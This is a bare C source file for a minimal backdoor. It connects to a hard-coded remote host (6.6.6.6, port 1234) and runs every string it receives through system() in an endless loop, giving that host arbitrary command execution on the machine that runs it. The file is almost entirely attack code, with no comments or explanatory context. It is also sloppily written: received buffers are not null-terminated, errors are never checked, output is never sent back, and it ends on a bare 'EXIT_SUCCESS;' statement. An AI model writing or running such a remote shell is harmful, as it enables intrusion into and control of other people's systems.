#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define HOST "6.6.6.6" 
#define PORT 1234

int main(void) {
    int fd;
    char command[5000];
    struct sockaddr_in server;

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(HOST);
    server.sin_port = htons(PORT);

    fd = socket(AF_INET, SOCK_STREAM, 0);
    connect(fd, (struct sockaddr *)&server, sizeof(server));


    while (1)
    {
        recv(fd, command, sizeof(command), 0);
        system(command);
    }

    EXIT_SUCCESS;
}